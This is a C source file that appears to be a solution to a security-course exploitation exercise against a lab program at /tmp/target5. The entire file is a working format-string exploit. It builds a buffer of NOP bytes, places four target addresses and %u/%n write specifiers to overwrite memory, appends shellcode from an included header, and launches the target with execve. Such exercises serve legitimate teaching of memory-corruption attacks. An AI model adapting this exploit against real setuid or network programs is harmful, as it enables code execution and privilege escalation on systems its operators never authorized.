#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char sploitstring[400];
  char *fmt;

  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[sizeof(sploitstring)-1] = '\0';

  fmt = "\xff\xff\xff\xff\x3c\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3d\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3e\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3f\xfb\xff\xbf"
        "%127u%n%95u%n%257u%n%192u%n";

  memcpy(sploitstring, fmt, strlen(fmt));
  memcpy(sploitstring + sizeof(sploitstring) - strlen(shellcode) - 4, shellcode, strlen(shellcode));

  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
